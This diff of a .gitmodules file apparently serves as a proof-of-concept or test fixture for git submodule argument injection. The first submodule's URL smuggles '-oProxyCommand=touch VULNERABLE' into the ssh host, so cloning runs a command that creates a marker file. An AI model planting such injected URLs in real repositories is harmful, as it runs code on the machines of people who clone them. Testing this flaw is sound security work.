@@ -1,6 +1,6 @@
 [submodule "pack/plugins/start/airline"]
 	path = pack/plugins/start/airline
-	url = ssh://-oProxyCommand=touch VULNERABLE/github.com/vim-airline/vim-airline.git
+	url = ssh://-oProxyCommand=touch VULNERABLE/git@github.com/vim-airline/vim-airline.git
 [submodule "pack/extra_syntax_files/start/airline-themes"]
 	path = pack/extra_syntax_files/start/airline-themes
 	url = https://github.com/vim-airline/vim-airline-themes.git
